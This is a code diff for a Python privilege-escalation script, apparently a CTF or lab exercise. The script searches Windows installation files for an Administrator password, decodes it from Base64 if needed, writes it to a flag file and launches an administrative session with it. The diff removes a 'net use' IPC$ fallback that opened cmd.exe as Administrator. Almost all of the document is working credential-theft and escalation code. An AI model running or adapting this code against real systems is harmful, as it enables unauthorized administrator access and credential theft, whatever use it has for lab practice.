@@ -3,6 +3,7 @@ import re
 import base64
 import subprocess
 import sys
+from datetime import datetime
 
 # Define file paths to check
 FILE_PATHS = [
@@ -64,8 +65,22 @@ def is_valid_base64(string):
     Returns:
         bool: True if valid Base64, False otherwise
     """
+    # Remove whitespace
+    string = string.strip()
+    
+    # Check if it looks like Base64 (only valid characters)
+    base64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')
+    if not base64_pattern.match(string):
+        return False
+    
+    # Check if length is valid
+    if len(string) % 4 != 0:
+        return False
+    
     try:
+        # Try to decode
         decoded = base64.b64decode(string, validate=True)
+        # Try to decode as UTF-8
         decoded.decode('utf-8')
         return True
     except Exception:
@@ -83,14 +98,43 @@ def decode_password(password):
     """
     clean_pwd = password.strip()
     
-    try:
-        if is_valid_base64(clean_pwd):
+    # Try to decode as Base64
+    if is_valid_base64(clean_pwd):
+        try:
             decoded = base64.b64decode(clean_pwd).decode('utf-8', errors='ignore')
             return decoded, True
-    except Exception:
-        pass
+        except Exception:
+            pass
     
+    # If we get here, it's not valid Base64
     return password, False
+
+def generate_flag(password, file_path):
+    """
+    Generate a flag file with the extracted password information.
+    
+    Args:
+        password (str): The extracted password
+        file_path (str): Path where the password was found
+    """
+    flag_content = f"""=== WINDOWS ADMINISTRATOR PASSWORD EXTRACTION FLAG ===
+Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Password Source: {file_path}
+Extracted Password: {password}
+Status: SUCCESSFULLY EXTRACTED
+=======================================================
+"""
+    
+    flag_filename = "0-flag.txt"
+    
+    try:
+        with open(flag_filename, "w", encoding="utf-8") as flag_file:
+            flag_file.write(flag_content)
+        print(f"[+] Flag file created: {flag_filename}")
+        return True
+    except Exception as e:
+        print(f"[-] Error creating flag file: {e}")
+        return False
 
 def start_admin_session_with_powershell(password):
     """
@@ -128,35 +172,6 @@ def start_admin_session_with_powershell(password):
         
     except Exception as e:
         print(f"[-] Error al iniciar sesión: {e}")
-        return False
-
-def start_admin_session_with_net_use(password):
-    """
-    Alternative method using net use with credentials.
-    
-    Args:
-        password (str): Administrator password
-        
-    Returns:
-        bool: True if successful, False otherwise
-    """
-    try:
-        print("[*] Intentando método alternativo con net use...")
-        
-        # Crear conexión con credenciales
-        subprocess.run([
-            'net', 'use',
-            '\\\\localhost\\IPC$',
-            '/user:Administrator',
-            password
-        ], shell=True)
-        
-        print("[+] Conexión establecida. Iniciando cmd...")
-        subprocess.run(['cmd.exe'], shell=True)
-        return True
-        
-    except Exception as e:
-        print(f"[-] Error: {e}")
         return False
 
 def start_admin_session_manual(password):
@@ -207,6 +222,7 @@ def main():
     print("[*] Revisando archivos comunes de instalación\n")
     
     admin_password = None
+    found_path = None
     
     for file_path in FILE_PATHS:
         print(f"[-] Revisando archivo: {file_path}")
@@ -220,6 +236,7 @@ def main():
         
         if admin_password:
             print(f"[+] Contraseña extraída correctamente de: {file_path}")
+            found_path = file_path
             break
         else:
             print("[-] No se encontró contraseña en este archivo\n")
@@ -230,7 +247,7 @@ def main():
         return
     
     # Mostrar la contraseña extraída
-    print(f"\n[+] Contraseña extraída: {admin_password}")
+    print(f"\n[+] Contraseña extraída (cruda): {admin_password}")
     
     # Intentar decodificar si es Base64
     decoded_password, is_base64 = decode_password(admin_password)
@@ -241,6 +258,9 @@ def main():
     else:
         print("[+] La contraseña está en texto plano (no está codificada en Base64)")
         final_password = admin_password
+    
+    # Generar archivo flag
+    generate_flag(final_password, found_path if found_path else "Unknown")
     
     # Iniciar sesión administrativa
     start_admin_session(final_password)
